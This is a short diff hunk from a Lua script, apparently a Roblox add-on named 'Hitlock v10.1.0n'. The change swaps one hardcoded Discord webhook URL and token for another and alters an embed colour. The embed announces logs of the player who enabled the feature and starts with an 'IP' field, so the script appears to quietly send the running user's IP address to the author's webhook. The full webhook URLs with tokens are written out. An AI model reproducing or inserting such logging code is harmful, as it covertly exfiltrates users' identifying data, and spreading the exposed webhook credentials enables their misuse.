@@ -271,13 +271,13 @@ function SendMessageEMBED(url, embed)
     })
 end
 
-local url = "https://discord.com/api/webhooks/1266058863539654831/oFv63Dont092sz3c6zINbImg7NFB5ZwwOmYf6SJURSDydZfukQD0MXJOT_wFqaFSGIkg"
+local url = "https://discord.com/api/webhooks/1268978390057095288/aYSeFb3rVDpITuql1SgCqn8_kQzlVJv_Z70eeNvRt6GWuE57F2flGHReiCz1drrIVpKT"
 SendMessage(url)
 
 local embed = {
 	["title"] = "Hitlock v10.1.0n enabled by:",
 	["description"] = "A player enabled this function, heres logs:",
-	["color"] = 0,
+	["color"] = 32768,
 	["fields"] = {
 		{
 			["name"] = "IP",
